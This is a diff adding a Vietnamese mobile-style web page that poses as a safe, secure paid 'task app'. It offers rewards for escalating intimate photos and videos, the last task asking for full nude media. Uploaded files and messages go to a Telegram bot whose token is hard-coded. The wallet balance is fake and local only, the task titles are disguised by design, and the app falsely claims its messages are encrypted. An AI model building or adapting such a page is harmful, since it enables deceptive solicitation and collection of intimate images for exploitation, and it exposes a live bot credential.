@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hệ Thống Quản Lý</title>
+    <!-- SweetAlert2 for beautiful popups -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <!-- FontAwesome for icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        
+        /* App Container for Mobile View */
+        body { 
+            background-color: #f4f6f9; /* Corporate light gray */
+            color: #333; 
+            padding-bottom: 50px; 
+            display: flex;
+            justify-content: center;
+        }
+        .app-container {
+            width: 100%;
+            max-width: 480px; /* Lock width to look like an app on PC */
+            background-color: #f4f6f9;
+            min-height: 100vh;
+            user-select: none; /* Prevent text selection */
+            -webkit-user-select: none;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        
+        /* Wallet Section - Corporate Blue */
+        .wallet-card { background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); color: white; margin: 20px; padding: 25px 20px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0, 198, 255, 0.3); text-align: center; position: relative; }
+        .wallet-title { font-size: 14px; opacity: 0.9; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+        .wallet-balance { font-size: 32px; font-weight: bold; margin-bottom: 15px; }
+        .btn-withdraw { background: white; color: #007bff; border: none; padding: 10px 25px; border-radius: 30px; font-weight: bold; font-size: 16px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; transition: transform 0.1s;}
+        .btn-withdraw:active { transform: scale(0.95); }
+        
+        /* Cooldown Alert */
+        .cooldown-alert { background: #e9ecef; color: #495057; margin: 0 20px 20px; padding: 20px 15px; border-radius: 15px; font-size: 15px; text-align: center; font-weight: 500; display: none; border: 1px solid #ced4da;}
+        .countdown-clock { font-size: 36px; font-weight: 900; margin-top: 10px; letter-spacing: 2px; font-family: 'Courier New', Courier, monospace; color: #007bff;}
+        
+        /* Task List */
+        .task-container { display: none; margin: 0 20px; }
+        .task-container.active { display: block; }
+        .task-card { background: white; padding: 15px; border-radius: 15px; margin-bottom: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; border-left: 5px solid #007bff; }
+        .task-info { flex: 1; padding-right: 15px; }
+        .task-desc { font-size: 15px; line-height: 1.4; color: #444; }
+        .task-reward { color: #007bff; font-weight: bold; font-size: 14px; margin-top: 5px; display: inline-block; background: #e7f1ff; padding: 3px 10px; border-radius: 10px; }
+        .btn-accept { background: #007bff; color: white; border: none; padding: 8px 15px; border-radius: 10px; font-weight: bold; font-size: 14px; white-space: nowrap; cursor: pointer; transition: transform 0.1s;}
+        .btn-accept:active { transform: scale(0.95); }
+
+        /* Current Task Section */
+        .current-task-section { display: none; margin: 20px; }
+        .current-task-card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0, 123, 255, 0.1); text-align: center; border: 2px dashed #007bff; }
+        .current-task-card h3 { color: #007bff; margin-bottom: 15px; font-size: 18px; }
+        
+        .current-task-desc { font-size: 18px; color: #333; margin-bottom: 20px; font-weight: 500; }
+        .btn-complete { background: #28a745; color: white; border: none; padding: 12px 0; border-radius: 15px; font-weight: bold; font-size: 16px; width: 100%; margin-bottom: 10px; cursor: pointer;}
+        .btn-change { background: #f8f9fa; color: #6c757d; border: none; padding: 12px 0; border-radius: 15px; font-weight: bold; font-size: 16px; width: 100%; cursor: pointer;}
+        
+        /* Footer Slogan */
+        .footer-slogan { text-align: center; color: #a0aabf; font-size: 13px; margin-top: 20px; padding-bottom: 20px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase;}
+        .footer-slogan i { margin: 0 5px; color: #007bff; }
+        
+        /* Message Section */
+        .message-section { margin: 0 20px 20px; }
+        .message-card { background: white; padding: 15px; border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-left: 5px solid #007bff; }
+        .message-title { font-weight: bold; color: #333; margin-bottom: 10px; font-size: 15px; display: flex; align-items: center; gap: 8px;}
+        .message-title i { color: #007bff; }
+        #quickMessage { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ced4da; font-size: 14px; margin-bottom: 10px; resize: vertical; min-height: 80px; outline: none; font-family: inherit;}
+        #quickMessage:focus { border-color: #007bff; }
+        .btn-send-msg { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 10px; font-weight: bold; font-size: 14px; width: 100%; cursor: pointer; transition: transform 0.1s; }
+        .btn-send-msg:active { transform: scale(0.95); }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="wallet-card">
+            <div class="wallet-title"><i class="fas fa-credit-card"></i> Ví tiền hiện có</div>
+            <div class="wallet-balance" id="balanceDisplay">... VNĐ</div>
+            <button class="btn-withdraw" onclick="withdrawMoney()"><i class="fas fa-money-bill-transfer"></i> Rút tiền hiện có</button>
+        </div>
+
+        <div class="cooldown-alert" id="cooldownAlert">
+            <i class="fas fa-clock"></i> Vui lòng đợi đến lần nhận nhiệm vụ tiếp theo:
+            <div class="countdown-clock" id="countdownTimer">12:00:00</div>
+        </div>
+
+        <div class="current-task-section" id="currentTaskSection">
+            <div class="current-task-card">
+                <h3><i class="fas fa-heart"></i> Nhiệm vụ đang làm</h3>
+                <div class="current-task-desc" id="currentTaskDesc">...</div>
+                <div class="task-reward" id="currentTaskReward" style="margin-bottom: 20px; font-size: 16px;">...</div>
+                
+                <!-- File Upload Hidden Input -->
+                <input type="file" id="mediaUpload" accept="image/*,video/*" style="display: none;">
+                <button class="btn-change" id="btnSelectMedia" onclick="document.getElementById('mediaUpload').click()" style="margin-bottom: 10px; background: #e7f1ff; color: #007bff; border: 1px dashed #007bff;">
+                    <i class="fas fa-camera"></i> Đính kèm Ảnh / Video
+                </button>
+                <div id="mediaPreviewName" style="font-size: 14px; color: #007bff; margin-bottom: 15px; display: none; font-weight: bold;"></div>
+
+                <button class="btn-complete" onclick="completeTask()"><i class="fas fa-check"></i> Gửi & Hoàn thành</button>
+                <button class="btn-change" onclick="changeTask()"><i class="fas fa-sync"></i> Hủy & Chọn nhiệm vụ khác</button>
+            </div>
+        </div>
+
+        <div id="taskListSection">
+            <div id="task-list" class="task-container active"></div>
+        </div>
+        
+        <!-- Tin nhắn nhanh -->
+        <div class="message-section">
+            <div class="message-card">
+                <div class="message-title"><i class="fas fa-comment-dots"></i> Gửi tin nhắn nhanh</div>
+                <textarea id="quickMessage" placeholder="Nhập lời nhắn gửi đến tôi..."></textarea>
+                <button class="btn-send-msg" onclick="sendQuickMessage()"><i class="fas fa-paper-plane"></i> Gửi tin nhắn</button>
+            </div>
+        </div>
+
+        <!-- Slogan -->
+        <div class="footer-slogan">
+            <i class="fas fa-shield-alt"></i> APP NHIỆM VỤ AN TOÀN BẢO MẬT GỬI QUA TELEGRAM <i class="fab fa-telegram-plane"></i>
+        </div>
+    </div>
+
+    <script>
+        // CẤU HÌNH TELEGRAM CỦA BẠN
+        const TELEGRAM_BOT_TOKEN = '8741437914:AAHZjk0SvWDeaAK3D8DPgp0Uke08ZVNd_g4';
+        const TELEGRAM_CHAT_ID = '8511070091';
+
+        // Hàm gửi tin nhắn văn bản (chỉ text)
+        function sendTelegramText(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).catch(err => console.error(err));
+        }
+
+        // Dữ liệu thử thách (Tiêu đề ngụy trang chuyên nghiệp)
+        const tasks = [
+            { title: 'Nhiệm vụ số 1', desc: 'Chụp ảnh selfie.', reward: 25000 },
+            { title: 'Nhiệm vụ số 2', desc: 'Chụp ảnh lấp ló.', reward: 50000 },
+            { title: 'Nhiệm vụ số 3', desc: 'Quay clip ngắn lấp ló.', reward: 50000 },
+            { title: 'Nhiệm vụ số 4', desc: 'Quay clip hoặc chụp ảnh full không che.', reward: 200000 }
+        ];
+
+        // Khởi tạo ví: Nếu chưa từng có dữ liệu thì cho sẵn 100k
+        let storedBalance = localStorage.getItem('loveWalletBalance');
+        let balance = storedBalance !== null ? parseInt(storedBalance) : 100000;
+        
+        // Tự động chuyển đổi nếu người dùng đang dùng số nhỏ (ví dụ 100) -> 100.000
+        if (balance > 0 && balance < 1000) { 
+            balance = balance * 1000; 
+            localStorage.setItem('loveWalletBalance', balance); 
+        }
+
+        let currentTask = JSON.parse(localStorage.getItem('currentTask'));
+        let clockInterval;
+
+        // Xử lý sự kiện khi chọn file
+        document.getElementById('mediaUpload').addEventListener('change', function(e) {
+            const fileName = e.target.files[0]?.name;
+            if (fileName) {
+                const preview = document.getElementById('mediaPreviewName');
+                preview.innerText = `Đã đính kèm: ${fileName}`;
+                preview.style.display = 'block';
+            }
+        });
+
+        // Cập nhật giao diện lúc mở app
+        function initApp() {
+            if (storedBalance === null) {
+                localStorage.setItem('loveWalletBalance', balance);
+            }
+            document.getElementById('balanceDisplay').innerText = balance.toLocaleString('vi-VN') + ' VNĐ';
+            renderTasks();
+            checkCurrentTask();
+            checkCooldownUI();
+        }
+
+        function renderTasks() {
+            const container = document.getElementById('task-list');
+            container.innerHTML = '';
+            tasks.forEach(task => {
+                container.innerHTML += `
+                    <div class="task-card">
+                        <div class="task-info">
+                            <div class="task-desc" style="font-weight: bold;">${task.title}</div>
+                            <div class="task-reward">${task.reward.toLocaleString('vi-VN')} VNĐ</div>
+                        </div>
+                        <button class="btn-accept" onclick="acceptTask('${task.title}', '${task.desc}', ${task.reward})">Nhận</button>
+                    </div>
+                `;
+            });
+        }
+
+        // Kiểm tra thời gian 12h
+        function canTakeTask() {
+            let lastDoneTime = localStorage.getItem('lastDoneTime');
+            if (lastDoneTime) {
+                let timePassed = Date.now() - parseInt(lastDoneTime);
+                let hours12 = 12 * 60 * 60 * 1000;
+                if (timePassed < hours12) {
+                    Swal.fire('Chưa đến giờ', `Bạn cần đợi hết thời gian hiển thị trên đồng hồ để nhận nhiệm vụ mới.`, 'warning');
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        // Nhận nhiệm vụ
+        function acceptTask(title, desc, reward) {
+            if (!canTakeTask()) return;
+
+            Swal.fire({
+                title: 'Chi tiết nhiệm vụ:',
+                html: `<div style="font-size: 18px; padding: 15px; color: #007bff; font-weight: bold; background: #e7f1ff; border-radius: 10px; margin-bottom: 10px;">${desc}</div><span style="font-size: 14px; color: #555;">Xác nhận nhận nhiệm vụ này?</span>`,
+                icon: 'question',
+                showCancelButton: true,
+                confirmButtonText: 'Nhận luôn',
+                cancelButtonText: 'Đóng',
+                confirmButtonColor: '#007bff'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    currentTask = { title, desc, reward };
+                    localStorage.setItem('currentTask', JSON.stringify(currentTask));
+                    
+                    sendTelegramText(`🔥 <b>NHẬN NHIỆM VỤ!</b>\n\n📌 <b>Tên:</b> ${title}\n📝 <b>Nội dung:</b> ${desc}\n💰 <b>Thưởng:</b> ${reward.toLocaleString('vi-VN')} VNĐ`);
+
+                    checkCurrentTask();
+                    checkCooldownUI();
+                    Swal.fire('Thành công', 'Đã nhận nhiệm vụ. Hãy hoàn thành nhé!', 'success');
+                }
+            });
+        }
+
+        function checkCurrentTask() {
+            const listSection = document.getElementById('taskListSection');
+            const currentSection = document.getElementById('currentTaskSection');
+            
+            // Nếu có nhiệm vụ đang làm VÀ chưa bị cooldown khóa
+            let isCooldown = false;
+            let lastDoneTime = localStorage.getItem('lastDoneTime');
+            if (lastDoneTime && (Date.now() - parseInt(lastDoneTime)) < (12 * 60 * 60 * 1000)) {
+                isCooldown = true;
+            }
+
+            if (isCooldown) {
+                listSection.style.display = 'none';
+                currentSection.style.display = 'none';
+            } else if (currentTask) {
+                listSection.style.display = 'none';
+                currentSection.style.display = 'block';
+                
+                const descEl = document.getElementById('currentTaskDesc');
+                descEl.innerText = currentTask.desc;
+                
+                document.getElementById('currentTaskReward').innerText = currentTask.reward.toLocaleString('vi-VN') + ' VNĐ';
+            } else {
+                listSection.style.display = 'block';
+                currentSection.style.display = 'none';
+            }
+        }
+
+        function changeTask() {
+            currentTask = null;
+            localStorage.removeItem('currentTask');
+            document.getElementById('mediaUpload').value = '';
+            document.getElementById('mediaPreviewName').style.display = 'none';
+            checkCurrentTask();
+        }
+
+        // Báo cáo hoàn thành (Gửi Media thẳng lên Telegram)
+        function completeTask() {
+            const fileInput = document.getElementById('mediaUpload');
+            const file = fileInput.files[0];
+
+            if (!file) {
+                Swal.fire('Thiếu minh chứng', 'Vui lòng đính kèm ảnh hoặc video trước khi hoàn thành.', 'warning');
+                return;
+            }
+
+            Swal.fire({
+                title: 'Đang gửi...',
+                text: 'Vui lòng chờ một chút nhé...',
+                allowOutsideClick: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            
+            // Nhận diện Ảnh hay Video
+            let endpoint = 'sendPhoto';
+            let mediaField = 'photo';
+            if (file.type.startsWith('video/')) {
+                endpoint = 'sendVideo';
+                mediaField = 'video';
+            }
+            
+            formData.append(mediaField, file);
+            formData.append('caption', `✅ <b>ĐÃ HOÀN THÀNH!</b>\n\n📌 <b>Nội dung:</b> ${currentTask.desc}\n💵 <b>Đã cộng:</b> ${currentTask.reward.toLocaleString('vi-VN')} VNĐ`);
+            formData.append('parse_mode', 'HTML');
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${endpoint}`;
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    balance += currentTask.reward;
+                    localStorage.setItem('loveWalletBalance', balance);
+                    localStorage.setItem('lastDoneTime', Date.now()); 
+                    
+                    document.getElementById('balanceDisplay').innerText = balance.toLocaleString('vi-VN') + ' VNĐ';
+                    
+                    currentTask = null;
+                    localStorage.removeItem('currentTask');
+                    
+                    fileInput.value = '';
+                    document.getElementById('mediaPreviewName').style.display = 'none';
+
+                    checkCurrentTask();
+                    checkCooldownUI();
+                    Swal.fire('Thành công!', 'Đã gửi minh chứng và cộng tiền vào ví.', 'success');
+                } else {
+                    Swal.fire('File quá lớn', 'Tệp đính kèm vượt quá 50MB. Vui lòng quay video ngắn hơn.', 'error');
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                Swal.fire('Lỗi mạng', 'Không thể kết nối, vui lòng kiểm tra lại mạng.', 'error');
+            });
+        }
+
+        // Rút tiền
+        function withdrawMoney() {
+            if (balance <= 0) {
+                Swal.fire('Ví rỗng', 'Bạn chưa có tiền trong ví.', 'error');
+                return;
+            }
+
+            Swal.fire({
+                title: 'Xác nhận rút tiền?',
+                text: `Bạn muốn rút ${balance.toLocaleString('vi-VN')} VNĐ?`,
+                icon: 'question',
+                showCancelButton: true,
+                confirmButtonText: 'Rút luôn',
+                cancelButtonText: 'Để sau',
+                confirmButtonColor: '#007bff'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    sendTelegramText(`💸 <b>YÊU CẦU RÚT TIỀN!</b>\n\n💵 <b>Số tiền:</b> ${balance.toLocaleString('vi-VN')} VNĐ`);
+                    balance = 0;
+                    localStorage.setItem('loveWalletBalance', balance);
+                    document.getElementById('balanceDisplay').innerText = '0 VNĐ';
+                    Swal.fire('Thành công', 'Đã báo cho anh yêu chuyển tiền!', 'success');
+                }
+            });
+        }
+
+        // Cập nhật giao diện đếm ngược 12H
+        function checkCooldownUI() {
+            let lastDoneTime = localStorage.getItem('lastDoneTime');
+            const alertBox = document.getElementById('cooldownAlert');
+            
+            clearInterval(clockInterval);
+
+            if (lastDoneTime) {
+                const hours12 = 12 * 60 * 60 * 1000;
+                
+                const updateClock = () => {
+                    let timePassed = Date.now() - parseInt(lastDoneTime);
+                    let timeLeft = hours12 - timePassed;
+                    
+                    if (timeLeft > 0) {
+                        alertBox.style.display = 'block';
+                        document.getElementById('taskListSection').style.display = 'none';
+                        document.getElementById('currentTaskSection').style.display = 'none';
+
+                        let h = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                        let m = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                        let s = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                        
+                        h = (h < 10) ? "0" + h : h;
+                        m = (m < 10) ? "0" + m : m;
+                        s = (s < 10) ? "0" + s : s;
+                        
+                        document.getElementById('countdownTimer').innerText = `${h}:${m}:${s}`;
+                    } else {
+                        alertBox.style.display = 'none';
+                        clearInterval(clockInterval);
+                        checkCurrentTask(); // Hiển thị lại task list
+                    }
+                };
+
+                updateClock();
+                clockInterval = setInterval(updateClock, 1000);
+            } else {
+                alertBox.style.display = 'none';
+            }
+        }
+
+        // Gửi tin nhắn nhanh
+        function sendQuickMessage() {
+            const msgInput = document.getElementById('quickMessage');
+            const msg = msgInput.value.trim();
+            if (!msg) {
+                Swal.fire('Thiếu thông tin', 'Vui lòng nhập nội dung tin nhắn trước khi gửi.', 'warning');
+                return;
+            }
+
+            Swal.fire({
+                title: 'Đang gửi...',
+                allowOutsideClick: false,
+                didOpen: () => { Swal.showLoading(); }
+            });
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: TELEGRAM_CHAT_ID, 
+                    text: `💬 <b>TIN NHẮN MỚI TỪ APP:</b>\n\n${msg}`, 
+                    parse_mode: 'HTML' 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    msgInput.value = '';
+                    Swal.fire('Thành công!', 'Tin nhắn của bạn đã được mã hóa và gửi đi.', 'success');
+                } else {
+                    Swal.fire('Lỗi', 'Không thể gửi tin nhắn.', 'error');
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                Swal.fire('Lỗi mạng', 'Vui lòng kiểm tra lại kết nối mạng.', 'error');
+            });
+        }
+
+        // Khởi chạy app
+        initApp();
+    </script>
+</body>
+</html>
